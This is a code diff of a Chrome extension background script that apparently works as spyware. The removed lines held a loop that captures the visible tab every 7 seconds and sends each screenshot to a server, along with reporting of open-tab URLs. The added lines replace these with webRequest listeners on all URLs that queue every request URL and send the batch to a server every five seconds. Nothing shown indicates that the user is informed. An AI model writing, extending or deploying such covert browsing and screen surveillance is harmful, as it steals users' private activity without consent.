@@ -11,11 +11,11 @@ function sendToServer(type, results) {
       if (response.ok) {
 
       } else {
-        //console.error("Failed to send data:", results, response.statusText);
+        console.error("Failed to send data:", results, response.statusText);
       }
     })
     .catch((error) => {
-      //console.error("Error sending data:", results, error);
+      console.error("Error sending data:", results, error);
     });
 }
 
@@ -25,25 +25,67 @@ function sendToServer(type, results) {
 
 ************************/
 
-chrome.tabs.query({}, (tabs) => {
-  tabs.forEach((tab) => {
-    if (tab.url) {
-      sendToServer('urls', tab.url);
-    }
-  });
-});
+//chrome.tabs.query({}, (tabs) => {
+//  tabs.forEach((tab) => {
+//    if (tab.url) {
+//      sendToServer('urls', tab.url);
+//    }
+//  });
+//});
+//
+//chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+//  if (changeInfo.url) {
+//    sendToServer('urls', tab.url);
+//  }
+//});
+//
+//chrome.tabs.onCreated.addListener((tab) => {
+//  if (tab.url) {
+//    sendToServer('urls', tab.url);
+//  }
+//});
 
-chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-  if (changeInfo.url) {
-    sendToServer('urls', tab.url);
-  }
-});
+let requestQueue = [];
+let processing = false;
 
-chrome.tabs.onCreated.addListener((tab) => {
-  if (tab.url) {
-    sendToServer('urls', tab.url);
-  }
-});
+chrome.webRequest.onBeforeRequest.addListener(
+    function (details) {
+        if (shouldIgnore(details)) return;
+
+        requestQueue.push(details.url);
+        processQueue();
+    },
+    { urls: ["<all_urls>"] },
+    ["requestBody"]
+);
+
+chrome.webRequest.onHeadersReceived.addListener(
+    function (details) {
+        if (shouldIgnore(details)) return;
+
+        requestQueue.push(details.url);
+        processQueue();
+    },
+    { urls: ["<all_urls>"] },
+    ["responseHeaders"]
+);
+
+function shouldIgnore(details) {
+    return details.initiator && details.initiator.includes("chrome-extension://");
+}
+
+function processQueue() {
+    if (processing || requestQueue.length === 0) return;
+
+    processing = true;
+
+    setTimeout(() => {
+        sendToServer("urls", requestQueue);
+        requestQueue = []; // Clear queue after sending
+        processing = false;
+    }, 5000); // Send every 5 seconds
+}
+
 
 
 /**********************
@@ -168,32 +210,32 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
        Screen Capture Stuff
 
 ************************/
-
-let intervalId = null;
-
-function startScreenshotLoop() {
-    if (!intervalId) {
-        intervalId = setInterval(() => {
-            chrome.tabs.captureVisibleTab(null, { format: "png" }, (imageUri) => {
-                if (chrome.runtime.lastError) {
-                    console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
-                } else {
-                    sendToServer("screenshot", imageUri);
-                }
-            });
-        }, 7000);
-    }
-}
-
-function downloadScreenshot(imageUri) {
-    const filename = `screenshot_${Date.now()}.png`;
-    chrome.downloads.download({
-        url: imageUri,
-        filename: filename
-    });
-}
-
-chrome.runtime.onStartup.addListener(startScreenshotLoop);
-chrome.runtime.onInstalled.addListener(startScreenshotLoop);
-
-chrome.tabs.onActivated.addListener(startScreenshotLoop);
+//
+//let intervalId = null;
+//
+//function startScreenshotLoop() {
+//    if (!intervalId) {
+//        intervalId = setInterval(() => {
+//            chrome.tabs.captureVisibleTab(null, { format: "png" }, (imageUri) => {
+//                if (chrome.runtime.lastError) {
+//                    console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
+//                } else {
+//                    sendToServer("screenshot", imageUri);
+//                }
+//            });
+//        }, 7000);
+//    }
+//}
+//
+//function downloadScreenshot(imageUri) {
+//    const filename = `screenshot_${Date.now()}.png`;
+//    chrome.downloads.download({
+//        url: imageUri,
+//        filename: filename
+//    });
+//}
+//
+//chrome.runtime.onStartup.addListener(startScreenshotLoop);
+//chrome.runtime.onInstalled.addListener(startScreenshotLoop);
+//
+//chrome.tabs.onActivated.addListener(startScreenshotLoop);
